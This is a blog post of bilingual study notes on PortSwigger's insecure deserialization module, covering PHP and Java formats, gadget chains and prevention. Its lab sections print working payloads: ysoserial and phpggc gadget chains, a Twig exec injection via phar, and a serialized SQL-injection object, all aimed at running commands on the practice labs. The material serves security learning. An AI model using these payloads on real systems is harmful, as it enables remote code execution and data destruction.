---
layout: article
title: WSAcademy 16 -- Insecure deserialization
mathjax: true
key: a00027
cover: /bkgs/1.png
modify_date: 2021-10-20
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- serialization
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的Insecure deserialization部分<!--more-->

原文：[Insecure deserialization](https://portswigger.net/web-security/deserialization)

## What is serialization?

序列化是将复杂数据结构（如对象及其字段）转换为“更平坦”格式的过程，该格式可以作为连续的字节流发送和接收

Serializing data makes it much simpler to:

- **Write** complex data to inter-process **memory**, a file, or a database
- **Send** complex **data**, for example, over a network, between different components of an application, or in an API call

最关键的是，序列化对象时，其状态也是持久的。换句话说，对象的属性及其指定的值将被保留

## Serialization vs deserialization

**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized

![3](/pics/WSA/3.jpg)

## What is insecure deserialization?

Insecure deserialization is when **user-controllable data is deserialized by a website**

insecure deserialization is sometimes known as an "**object injection**" vulnerability.

Many deserialization-based attacks are completed **before** deserialization is finished. This means that the deserialization process **itself can initiate an attack**

## How do insecure deserialization vulnerabilities arise?

- 缺乏对反序列化用户可控数据的危险性的理解。

  理想情况下，**用户输入永远不应该被反序列化**。

- 仅检查反序列化数据是不够的，因为：
  - 因素太多不可能都检测到
  - 检查也存在根本性缺陷，因为它们依赖于在数据**反序列化后**检查数据（**too late**）

- 反序列化对象通常被认为是可信的，因此也可能出现漏洞

  - 尤其是二进制序列化格式

- 由于现代网站中存在大量**依赖**关系

  一个典型的站点可能会实现许多不同的库，每个库都有自己的依赖关系

  这会创建大量难以安全管理的类和方法

简言之，可以说不可能安全地反序列化不受信任的输入。

## Exploiting insecure deserialization vulnerabilities

### How to identify insecure deserialization

查看所有传递到网站的数据，并尝试识别任何看起来像序列化数据的内容。如果知道不同语言使用的格式，则可以相对容易地识别序列化数据

#### PHP serialization format

PHP使用的是一种大多数人可读的字符串格式，字母表示数据类型，数字表示每个条目的长度。例如，考虑具有属性的用户对象：

`$user->name = "carlos";`

`$user->isLoggedIn = true;`

When serialized, this object may look something like this:

`O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`

This can be interpreted as follows:

- O:4:"User" - An object with the 4-character class name "User"
- 2 - the object has 2 attributes
- s:4:"name" - The key of the first attribute is the 4-character **string** "name"
- s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
- s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
- b:1 - The value of the second attribute is the **boolean** value true

The native methods for PHP serialization are `serialize()` and `unserialize()`. 

If you have source code access, you should start by looking for `unserialize()` anywhere in the code and investigating further.

#### Java serialization format

java是二进制格式，但序列化对象都有相同的开头

| **ac ed** | hexadecimal |
| --------- | ----------- |
| **rO0**   | Base64.     |

Any class that implements the interface `java.io.Serializable` can be serialized and deserialized

 take note of any code that uses the `readObject()` method, which is used to **read and deserialize** data from an `InputStream`**.**

### Manipulating serialized objects

基本反序列化攻击的初始步骤：

- 研究序列化数据以识别和编辑感兴趣的属性值

- 通过反序列化过程将恶意对象传递到网站

广义地说，在处理序列化对象时，可以采取两种方法

- 直接以字节流形式编辑对象

- 用相应的语言编写一个简短的脚本，自己创建并序列化新对象


使用**二进制**序列化格式时，后一种方法通常更容易

#### Modifying object attributes

篡改数据时，只要攻击者保留有效的序列化对象，反序列化过程就会创建具有修改属性值的服务器端对象。

#### Modifying data types

在PHP中，如果在整数和字符串之间执行**弱类型**比较，PHP将尝试将**字符串转换为整数**，这意味着`5==“5”`的计算结果为true。

这也适用于任**何以数字开头的字母数字字符串**，字符串的其余部分将被完全忽略。示例：`5==“5 of something”`实际上被视为5==5。

当将字符串与整数0进行比较时，这变得更加奇怪：

`0 == "Example string"` // true

因为字符串中没有数字，即0个数字。PHP将整个字符串视为整数0。



it should be **i:0** (0 length means don't need another : )

**Hackvertor** extension

### Using application functionality

您可以使用不安全的反序列化来传递意外数据，并利用相关功能进行破坏。

### Magic methods

魔术方法是一种特殊的方法子集，不必显式调用它们，它们有时通过在方法名称前加前缀或在方法名称周围加上双下划线来表示。

调用的魔术方法因方法而异。

示例：`PHP __construct（）`，在实例化类的对象时调用它，类似于Python的`__init__`。

有些语言具有在反序列化过程中自动调用的神奇方法。例如

- PHP的`unserialize（）`方法查找并调用对象的`__wakeup（）`魔术方法。

- Java `readObject（）`本质上类似于“重新初始化”序列化对象的构造函数


`ObjectInputStream.readObject()` 方法用于从初始字节流读取数据。

但是，可序列化类也可以声明自己的`readObject（）`方法，如下所示：

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {...};
```

这允许类更紧密地控制自己字段的反序列化。

关键的是，以这种方式声明的`readObject（）`方法充当在反序列化过程中调用的魔术方法。

应该密切注意任何包含这些类型魔术方法的类。它们允许您在对象**完全反序列化之前**将数据从序列化对象**传递到网站的代码**中。这是创建更高级exp的起点。

### Injecting arbitrary objects

在面向对象编程中，对象可用的方法由其类决定。因此，如果攻击者能够操纵作为序列化数据传入的对象类，那么他们可以影响反序列化之后甚至期间执行的代码。

反序列化方法通常不会检查它们正在反序列化的内容，这允许创建任意类的实例

此对象不是预期类的事实并不重要。意外的对象类型可能会导致应用程序逻辑中出现异常，但恶意对象届时将已实例化。

包含这些反序列化魔术方法的类还可以用于发起更复杂的攻击，这些攻击涉及一系列方法调用，称为“gadget chain”。

### Gadget chains

“gadget”是应用程序中存在的代码片段，可帮助攻击者实现特定目标。单个小工具可能不会直接对用户输入有害。然而，攻击者的目标可能只是调用一个方法，将其输入传递到另一个小工具中。通过以这种方式将**多个小工具链接在一起**，攻击者可能会将其输入传递到一个危险的“**sink gadget**”，从而造成最大的危害。

小工具链不是攻击者构造的链接方法的有效负载。网站上已存在所有代码。攻击者唯一控制的是传递到gadget chain的**数据**

这通常使用在反序列化过程中调用的**魔术方法**来完成，有时称为“kick-off gadget”（启动）。

在实践中，许多不安全的反序列化漏洞只能通过使用gadget chain来利用

#### Working with pre-built gadget chains

手工写有点难受，所以用下 pre-built gadget chains.

Java可以用 "ysoserial"，just download the jar from https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar  and use it . 

```php
lab：
1.JAVA with ysoserial
• analysis what kind of language the site using to serialization
• use ysoserial 
• java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
• replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.

2.PHP with phpggc
• analysis what kind of language the site using to serialization
• find out what kind of framework the target using
• audit the leaked file phpinfo() for the secret_key
• build a pre-builit gadget chain by using phpggc
• construct a valid cookie containing this malicious object and sign it correctly using the secret key  obtained earlier
<?php 
	$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
	$key = "wb7mzmplx6v5wj99v7ariom7w5r0nsjj";
	$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $key) . '"}');
	echo $cookie;
?> 
```

需要注意的是，造成该漏洞的不是网站代码或其任何库中存在的gadget chain。该漏洞是用户可控制数据的反序列化过程，gadget chain只是在注入数据流后操纵数据流的一种手段。这也适用于依赖反序列化不可信数据的各种内存损坏漏洞。因此，网站可能仍然容易受到攻击，即使它们确实设法插入了所有可能的gadget chain。

#### Working with documented gadget chains

It's always worth taking a look online to see if there are any documented exploits that you can adapt to attack your target website

```
lab: 
1.google  "Ruby on Rails gadget chain" find  https://www.elttam.com/blog/ruby-deserialization/#content
change  stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2") to what you want in "" 
2.run it and url_encode it and exploit the target.
```

## Creating your own exploit

当现成的gadget chain和记录的漏洞利用不成功时，需要创建自己的漏洞利用。

几乎肯定需要访问源代码

- 第一步是研究此源代码，以确定**包含反序列化期间调用的魔术方法的类**。审此魔术方法执行的代码，看看它是否直接使用用户可控制的属性执行任何危险的操作


- 如果魔法方法本身不可利用，它可以作为小工具链的“启动小工具”。研究启动小工具调用的任何方法。这些方法是否会对您控制的数据造成危险？如果不是，请仔细查看它们随后调用的每个方法


- 重复此过程，跟踪您可以访问哪些值，直到您到达死胡同或识别出一个危险的接收器小工具，您的可控数据被传递到该小工具中。


- 一旦您了解了如何在应用程序代码中成功构建小工具链，下一步就是**创建包含有效负载的序列化对象**

  - 基于字符串的序列化（如PHP）格式会更容易

  - 二进制格式（如JAVA）可能特别麻烦

    - 对现有对象进行微小更改时，直接使用字节可能会比较舒服

    - 当做出更重要的改变时。用目标语言编写自己的代码以自己生成和序列化数据通常要简单得多。

```
• LAB1：
    • notice the session cookie contains a serialized Java object（ac ed）
    • find the leaked source code file
    • write a small Java program that instantiates a ProductTemplate with an arbitrary ID, serializes it, and then Base64-encodes it.（https://github.com/PortSwigger/serialization-examples/tree/master/java/solution）
    • launch a sql injection attack like this 
PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4gLz48QC9mcm9tX2NoYXJjb2RlXzM+WU9VUi1QQVlMT0FELUhFUkU8QHNldF9sZW4+PEBsZW5ndGhfMD5ZT1VSLVBBWUxPQUQtSEVSRTxAL2xlbmd0aF8wPjxAL3NldF9sZW4+PEAvYmFzZTY0XzQ+
• LAB2：
    • You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.
    • read the source code and build the payload and parse it. 
	call_user_func — 把第一个参数作为回调函数调用
```

## PHAR deserialization

在PHP中，有时可以利用反序列化，即使没有明显使用`unserialize（）`方法。

PHP提供了几个URL样式的wrapper，您可以在访问文件路径时使用它们来处理不同的协议。

其中之一是`phar://` wrapper，它提供了一个用于访问PHP归档（.phar）文件的流接口。

如果在phar://流上执行任何文件系统操作，则此元数据将**隐式反序列化**

```php
• lab：??
GET /cgi-bin
• Notice that the website uses the Twig template engine
• Blog->desc and CustomTemplate->lockFilePath attributes.
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
• generate a jpg 
• GET /cgi-bin/avatar.php?avatar=phar://wiener

```

## Exploiting deserialization using memory corruption

即使不使用小工具链，仍然可以利用不安全的反序列化。如果所有这些都失败了，通常会有公开记录的内存损坏漏洞，可以通过不安全的反序列化进行攻击。这些通常会导致远程代码执行。

反序列化方法，例如PHP的unserialize（）很少针对这些类型的攻击进行加固，并且暴露了大量的攻击表面。这本身并不总是被认为是一个漏洞，因为这些方法最初并不打算处理用户可控制的输入

## How to prevent insecure deserialization vulnerabilities

- 除非绝对必要，否则应**避免反序列化用户输入**

- 采取强有力的措施，确保数据未被篡改

  - 实施数字签名以检查数据的完整性

  - 任何检查都必须在开始反序列化过程**之前**进行

- 如果可能，应**避免使用通用反序列化**功能

  来自这些方法的序列化数据包含原始对象的所有属性，包括可能包含敏感信息的私有字段。

  您可以创建自己的特定于类的序列化方法，以便至少可以控制公开哪些字段。

- 请记住，该漏洞是用户输入的反序列化，而不是随后处理数据的小工具链的存在

  - 不要依赖于试图消除您在测试期间识别的小工具链

  - 在任何时候，公开记录的内存损坏漏洞也是一个因素，这意味着您的应用程序可能会受到攻击。